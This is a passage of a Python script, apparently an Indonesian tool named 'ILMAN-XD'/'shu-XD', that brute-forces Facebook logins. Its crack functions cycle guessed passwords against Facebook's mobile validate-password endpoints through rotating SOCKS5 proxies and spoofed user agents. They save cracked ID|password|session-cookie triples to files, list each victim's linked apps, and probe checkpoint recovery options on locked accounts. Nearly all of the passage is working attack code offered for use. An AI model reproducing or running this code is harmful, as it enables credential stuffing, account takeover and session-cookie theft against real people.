15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{x}├──{k} {idf}|{pw}{N}')     
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				os.popen('play-audio data/cp.mp3')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print(f'\r{x}├── {H}{idf}|{pw}|{kuki}{N}')
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					os.popen('play-audio data/ok.mp3')
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
					nok=1
					for muncul in apkaktif:
						infoakun+= (f"	{x}[{h}{nok}{x}] {b}{muncul[0]} {muncul[1]}{x}\n")
						nok+=1

					hit=0
					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
					hit=0
					for muncul in apkexp:
						hit+=1
						infoakun += (f"	{x}[{k}{hit}{x}] {m}{muncul[0]} {muncul[1]}{x}\n")
					print(f'\r{x}├── {H}{idf}|{pw}|{kuki}\n{infoakun}{x}')
					os.popen('play-audio data/ok.mp3')
					ok+=1
					break

			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(1)
	loop+=1
#------------------[ METHODE-MBASIC-2 ]-------------------#
def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r💐 {P}[{bo}Mbasic{P}]{P}[{b}{loop}{P}/{p}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{m}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua2,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://free.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'ms-MY,ms;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{x}——>{k} {idf}|{pw}{N}')     
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				os.popen('play-audio .cp.mp3')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
				user=idf
				infoakun = ""
				session = requests.Session()
				cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
				cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
				apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
				nok=1
				for muncul in apkaktif:
					infoakun+= (f"	{x}[{h}{nok}{x}] {b}{muncul[0]} {muncul[1]}{x}\n")
					nok+=1

				hit=0
				apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
				hit=0
				for muncul in apkexp:
					hit+=1
					infoakun += (f"	{x}[{k}{hit}{x}] {m}{muncul[0]} {muncul[1]}{x}\n")
				print(f'\r{x}——> {H}{idf}|{pw}|{kuki}\n{ua}\n{infoakun}{x}')
				os.popen('play-audio .ok.mp3')
				ok+=1
				break

			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(1)
	loop+=1

#			if "checkpoint" in po.cookies.get_dict().keys():
#				print(f'\r{K}>> {idf}|{pw}{N}')     
#				os.popen('play-audio .cp.mp3')
#				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
#				akun.append(idf+'|'+pw)
#				cp+=1
#				break
#			elif "c_user" in ses.cookies.get_dict().keys():
#				ok+=1
#				coki=po.cookies.get_dict()
#				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
#				print(f'\r{H}>> {idf}|{pw}|{kuki}{N}')
#				os.popen('play-audio .ok.mp3')
#				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
#				cek_apk(session,coki)
#				break
#				
#			else:
#				continue
#		except requests.exceptions.ConnectionError:
#			time.sleep(31)
#	loop+=1

#---------------------[ METHODE-TOUCH-3 ]---------------------#
def cracktouch(idf,pwv):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
	nip=random.choice(prox)
	proxs= {'http': 'socks5://'+nip}
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write('\r%s ☬ %s/%s ☬ OK:%s ☬ CP:%s ☬ %s%s%s ☬'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'touch.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://touch.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://touch.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'touch.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://touch.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://touch.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://touch.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				elif 'ya' in princp:
					print('\n')
					statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='ILMAN-XD CP'))
					open('/sdcard/ILMAN-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/ILMAN-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='ILMAN-XD OK'))
					ok+=1
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/ILMAN-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					infoakun += (f"\n[bold cyan][•] LIST ACTIVE APPLICATIONS :[/bold cyan] \n")
					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
					nok=1
					for muncul in apkaktif:
						infoakun+= (f"[bold cyan][{nok}] {muncul[0]} {muncul[1]}[/bold cyan]\n")
						nok+=1

					hit=0
					infoakun += (f"\n[bold yellow][•] LIST EXPIRED APPLICATIONS :[/bold yellow]\n")
					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
					hit=0
					for muncul in apkexp:
						hit+=1
						infoakun += (f"[bold yellow][{hit}] {muncul[0]} {muncul[1]}[/bold yellow]\n")
					print('\n')
					statusok = f'[bold green][•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]ILMAN-XD OK[/bold green]'))
					ok+=1
					break


			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#----------------------[ METHODE-MTOUCH+MOBILE-4 ]-----------------#
def crackmbasic(idf,pwv):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
	nip=random.choice(prox)
	proxs= {'http': 'socks5://'+nip}
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write('\r%s ☬ %s/%s ☬ OK:%s ☬ CP:%s ☬ %s%s%s ☬'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				elif 'ya' in princp:
					print('\n')
					statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='ILMAN-XD CP'))
					open('/sdcard/ILMAN-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/ILMAN-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='OK'))
					ok+=1
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/ILMAN-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					infoakun += (f"\n[bold cyan][•] LIST ACTIVE APPLICATIONS :[/bold cyan] \n")
					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
					nok=1
					for muncul in apkaktif:
						infoakun+= (f"[bold cyan][{nok}] {muncul[0]} {muncul[1]}[/bold cyan]\n")
						nok+=1

					hit=0
					infoakun += (f"\n[bold yellow][•] LIST EXPIRED APPLICATIONS :[/bold yellow]\n")
					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
					hit=0
					for muncul in apkexp:
						hit+=1
						infoakun += (f"[bold yellow][{hit}] {muncul[0]} {muncul[1]}[/bold yellow]\n")
					print('\n')
					statusok = f'[bold green][•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]ILMAN-XD OK[/bold green]'))
					ok+=1
					break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#--------------------[ CHECK-OPSI-CHEKPOINT ]-------------------#
def ceker(idf,pw):
	global cp
	ua = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.128 Safari/537.36 FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.services;FBDV/EVR-L29;FBSV/10;FBLR/0;FBBK/1;FBCA/arm64-v8a:;]'
	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	try:
		hi = ses.get('https://mbasic.facebook.com')
		ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
		jo = ho.find('form')
		data = {}
		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
		opsi = kent.find_all('option')
		if len(opsi)==0:
			print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
		else:
			for opsii in opsi:
				print('\r%s---> %s%s'%(kk,opsii.text,x))
	except Exception as c:
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		print('\r%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s'%(u,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
#--------------------------[ CHECK-OPSI-CHEKPOINT-2 ]----------------#
def cek_opsi():
	c = len(akun)
	hu = 'Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)
	cetak(nel(hu, title='CEK OPSI'))
	input(x+'['+h+'•'+x+'] Mulai')
	cek = '# PROSES CEK OPSI DIMULAI'
	sol().print(mark(cek, style='green'))
	love = 0
	for kes in akun:
		try:
			try:
				id,pw = kes.split('|')[0],kes.split('|')[1]
			except IndexError:
				time.sleep(2)
				print('\r%s++++ %s ----> Error      %s'%(b,kes,x))
				print('\r%s---> Pemisah Tidak Didukung Untuk Program Ini%s'%(u,x))
				continue
			bi = random.choice([u,k,kk,b,h,hh])
			print('\r%s---> %s/%s ---> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
			ua = 'Mozilla/5.0 (Linux; Android 11; TECNO KD8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4755.101 Mobile Safari/537.36'
			ses = requests.Session()
			header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			hi = ses.get('https://mbasic.facebook.com')
			ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					jo = ho.find('form')
					data = {}
					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
					for anj in jo('input'):
						if anj.get('name') in lion:
							data.update({anj.get('name'):anj.get('value')})
					kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
					else:
						for opsii in opsi:
							print('\r%s---> %s%s'%(kk,opsii.text,x))
				except:
					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
					print('\r%s---> Tidak Dapat Mengecek Opsi%s'%(u,x))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s++++ %s|%s ----> OK       %s'%(h,id,pw,x))
			else:
				print('\r%s++++ %s|%s ----> SALAH       %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
			sol().print(mark(li, style='red'))
			exit()
	dah = '# DONE'
	sol().print(mark(dah, style='green'))
	exit()
#----------------------[ CEK-APLIKASI ]---------------------#
def cek_apk(session,cookie):
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":cookie}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi aktif di akun ini.")
	else:
		for i in range(len(game)):
			print("   %s%s. %s%s"%(H,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":cookie}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi kadaluarsa di akun ini.")
	else:
		for i in range(len(game)):
			print("   %s%s. %s%s"%(K,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))

#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('/sdcard/shu-XD-DUMP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('pkg install play-audio')
	except:pass
	try:os.system('clear')
	except:pass
	ilman(f'\n\t{x}——> {h}shu-XD :)')
	time.sleep(2)
	login()

#>>>>> THANKS TO THIS HERE <<<<<<
              #>>>>> SHU-XD <<<<<#
